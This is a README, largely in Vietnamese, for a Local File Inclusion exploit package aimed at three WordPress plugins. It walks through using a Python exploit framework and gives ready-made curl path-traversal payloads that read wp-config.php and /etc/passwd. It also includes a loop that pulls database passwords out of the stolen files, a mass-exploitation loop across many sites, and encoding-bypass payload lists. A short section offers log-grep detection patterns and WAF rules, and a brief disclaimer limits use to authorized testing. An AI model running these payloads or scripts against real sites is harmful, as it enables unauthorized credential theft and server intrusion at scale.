# PoC LFI Exploitation - Complete Package

## 📦 Nội dung Package

```
d:\SOC\wordpress\
├── LFI_EXPLOIT_PoC.md                    # Tài liệu PoC chi tiết (Markdown)
├── LFI_EXPLOITATION_GUIDE.md             # Hướng dẫn khai thác từng bước
├── LFI_PAYLOAD_COLLECTION.txt            # Bộ sưu tập payloads cho all 3 plugins
├── wordpress_lfi_exploit.py              # Exploit framework (Python)
├── VULNERABILITY_ANALYSIS_REPORT.md      # Report phân tích lỗ hổng
└── README.md                             # File này
```

---

## 🎯 Quick Start

### Installation
```bash
pip install requests
```

### Khai thác nhanh chóng

**Backuply:**
```bash
python wordpress_lfi_exploit.py -t http://target.com -p backuply -f "wp-config.php" -o backuply_config.txt
```

**Aruba Hispeed Cache:**
```bash
python wordpress_lfi_exploit.py -t http://target.com -p aruba -f "../../../../etc/passwd" -o passwd.txt
```

**CartFlows:**
```bash
python wordpress_lfi_exploit.py -t http://target.com -p cartflows -f "../../../../wp-config.php" -o config.txt
```

---

## 📋 File Details

### 1. LFI_EXPLOIT_PoC.md
**Mục đích**: Tài liệu chi tiết về cách khai thác  
**Nội dung**:
- Description chi tiết cho từng plugin
- HTTP request examples
- CURL/PowerShell commands
- Python exploit script example
- Impact assessment
- Mitigation strategies

**Cách sử dụng**: Tham khảo lý thuyết, hiểu cách hoạt động của lỗ hổng

### 2. LFI_EXPLOITATION_GUIDE.md
**Mục đích**: Hướng dẫn từng bước khai thác  
**Nội dung**:
- Tổng quan lỗ hổng (1 bảng)
- Chuẩn bị (yêu cầu, files)
- 3 plugin riêng biệt:
  - Backuply: 3 cách khai thác
  - Aruba Cache: CURL + PowerShell examples
  - CartFlows: Multiple AJAX endpoints
- Advanced techniques (encoding bypass)
- Sensitive files to read
- Detection & forensics
- Mitigation checklist

**Cách sử dụng**: Hướng dẫn thực tế step-by-step

### 3. LFI_PAYLOAD_COLLECTION.txt
**Mục đích**: Bộ sưu tập tất cả payloads có sẵn  
**Nội dung**:
- Backuply payloads:
  - Basic file reads
  - Path traversal
  - Encoded variations
  - Backup/restore actions
- Aruba payloads:
  - Settings page
  - Direct file access
  - AJAX endpoints
  - File parameters
- CartFlows payloads:
  - Debugger endpoint
  - Log status endpoint
  - Admin menu endpoint
  - All AJAX actions
- Generic WordPress files
- Encoding variations
- Bash/Python/PowerShell one-liners

**Cách sử dụng**: Copy-paste payloads vào requests

### 4. wordpress_lfi_exploit.py
**Mục đích**: Exploit framework hoàn chỉnh  
**Tính năng**:
- Tích hợp exploit cho 3 plugins
- Automatic endpoint detection
- Multiple exploitation methods per plugin
- Color-coded output
- Session cookie support
- SSL verification option
- Output file saving
- Error handling

**Cách chạy**:
```bash
python wordpress_lfi_exploit.py --help

# Basic
python wordpress_lfi_exploit.py -t http://target -p backuply -f "wp-config.php"

# Advanced
python wordpress_lfi_exploit.py -t http://target -p cartflows -f "../../../wp-config.php" \
  -c "wordpress_logged_in=abc123" --no-ssl-verify -o output.txt
```

### 5. VULNERABILITY_ANALYSIS_REPORT.md
**Mục đích**: Báo cáo phân tích lỗ hổng  
**Nội dung**:
- Summary chung
- LFI vulnerabilities detail (222 findings)
- Public endpoints issues (157 findings)
- False positive analysis (13,612 INFO level)
- Top 20 dangerous plugins
- Priority recommendations
- Next steps

---

## 🔍 Lỗ Hổng Tóm Tắt

### 1️⃣ BACKUPLY - 20 LFI Findings 🔴 CRITICAL

| Metric | Value |
|--------|-------|
| Vulnerable File | `backup_ins.php` |
| Vulnerable Lines | 1387, 1389, 1460, 1647, 1750 |
| Attack Vector | `POST/GET file parameter` |
| Required Auth | Usually No (depends on config) |
| Impact | Read arbitrary files |
| Exploitability | Easy |

**Exploit:**
```bash
curl "http://localhost/wp-admin/admin-ajax.php?action=backuply_backup&file=../../../../etc/passwd"
```

### 2️⃣ ARUBA HISPEED CACHE - 17 LFI Findings 🔴 CRITICAL

| Metric | Value |
|--------|-------|
| Vulnerable Files | Multiple (Settings, admin pages) |
| Vulnerable Lines | 23, 67, 74, 86, 98 |
| Attack Vector | `file / view / include parameters` |
| Required Auth | Admin access (may be required) |
| Impact | Directory traversal, file read |
| Exploitability | Easy |

**Exploit:**
```bash
curl "http://localhost/wp-admin/admin.php?page=aruba-hispeed-cache&file=../../../../etc/passwd"
```

### 3️⃣ CARTFLOWS - 16 LFI Findings 🔴 CRITICAL

| Metric | Value |
|--------|-------|
| Vulnerable Files | debugger.php, log-status.php, admin-menu.php |
| Vulnerable Lines | 117, 228, 235, 915, 121 |
| Attack Vector | `AJAX action parameters (file/log_file)` |
| Required Auth | May require authentication |
| Impact | Log disclosure, file read |
| Exploitability | Easy |

**Exploit:**
```bash
curl "http://localhost/wp-admin/admin-ajax.php?action=cartflows_debug&file=../../../../wp-config.php"
```

---

## 🚀 Common Usage Scenarios

### Scenario 1: Extract Database Credentials
```bash
# All 3 plugins
for plugin in backuply aruba cartflows; do
  python wordpress_lfi_exploit.py -t http://target -p $plugin -f "wp-config.php" -o ${plugin}_config.txt
done

# Extract credentials from files
grep "DB_PASSWORD\|DB_USER\|DB_NAME" backuply_config.txt
```

### Scenario 2: Find System Information
```bash
# Read /etc/passwd
python wordpress_lfi_exploit.py -t http://target -p backuply -f "../../../../etc/passwd" -o passwd.txt

# Read /etc/hostname
python wordpress_lfi_exploit.py -t http://target -p aruba -f "../../../../etc/hostname" -o hostname.txt

# Read /proc/version
python wordpress_lfi_exploit.py -t http://target -p cartflows -f "../../../../proc/version" -o version.txt
```

### Scenario 3: Automated Mass Exploitation
```bash
# Test multiple targets
targets=("http://site1.com" "http://site2.com" "http://site3.com")

for target in "${targets[@]}"; do
  echo "[*] Testing $target"
  python wordpress_lfi_exploit.py -t $target -p backuply -f "wp-config.php" -o ${target//\//_}_backuply.txt 2>/dev/null
done
```

### Scenario 4: Encoding Bypass Testing
```bash
# From LFI_PAYLOAD_COLLECTION.txt
payloads=(
  "wp-config.php"
  "../../../../wp-config.php"
  "..%2F..%2F..%2Fwp-config.php"
  "..%252F..%252F..%252Fwp-config.php"
  "%2e%2e%2fwp-config.php"
)

for payload in "${payloads[@]}"; do
  curl "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=$payload" 2>/dev/null | head -5
done
```

---

## 🛡️ Defense Detection

### Log Patterns to Search:
```bash
# Find LFI attempts
grep -r "backuply\|cartflows\|aruba" access.log | grep -E "(\.\./|%2e%2e|%252f)"

# Find wp-config access
grep "wp-config\|wp-settings\|wp-load" access.log

# Find /etc/passwd attempts
grep "passwd\|shadow\|hostname" access.log
```

### WAF Rules:
```
# Block directory traversal
RewriteCond %{REQUEST_URI} \.\.|%2e%2e [NC]
RewriteRule ^ - [L,R=403]

# Block sensitive files
<FilesMatch "wp-config\.php">
  Deny from all
</FilesMatch>
```

---

## 📊 Results Interpretation

### Successful Exploitation Indicators:
- ✅ wp-config.php content with `<?php` and `define()`
- ✅ /etc/passwd showing user list
- ✅ Log file content with errors/warnings
- ✅ HTTP 200 status with large content length

### Failed Exploitation Indicators:
- ❌ HTTP 404 Not Found
- ❌ "Access Denied" message
- ❌ Empty response
- ❌ Plugin error message

---

## ⚠️ Legal & Ethical Notes

**IMPORTANT**: 
- ✅ Only test on systems you own or have written authorization to test
- ✅ Document all findings for the system owner
- ✅ Destroy or securely handle any captured data
- ⚠️ Unauthorized access is illegal under computer fraud laws (CFAA)

---

## 🔧 Troubleshooting

### Problem: "Connection refused"
- Check target URL is correct
- Verify WordPress site is running
- Check firewall rules

### Problem: "No output received"
- Try different file paths
- May need authentication cookies
- Plugin might not be installed

### Problem: "SSL certificate verification failed"
- Use `--no-ssl-verify` flag
- Update certificates
- Check for MITM

---

## 📚 References

- OWASP: Local File Inclusion
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- WordPress Security: Plugin Vulnerabilities
- CVE Database: Search for plugin-specific CVEs

---

## 🎓 Learning Resources

1. Read `LFI_EXPLOIT_PoC.md` for detailed vulnerability explanation
2. Study the vulnerable code patterns in each plugin
3. Try different payloads from `LFI_PAYLOAD_COLLECTION.txt`
4. Use `wordpress_lfi_exploit.py` to automate exploitation
5. Practice on intentionally vulnerable VMs (DVWA, WebGoat)

---

## 📞 Support

For questions or issues:
1. Check the file you're referencing exists
2. Verify URL format is correct
3. Try using `--no-ssl-verify` if HTTPS
4. Check your Python version is 3.6+

---

*Created for authorized security testing and educational purposes*  
*Last Updated: 2026-06-17*
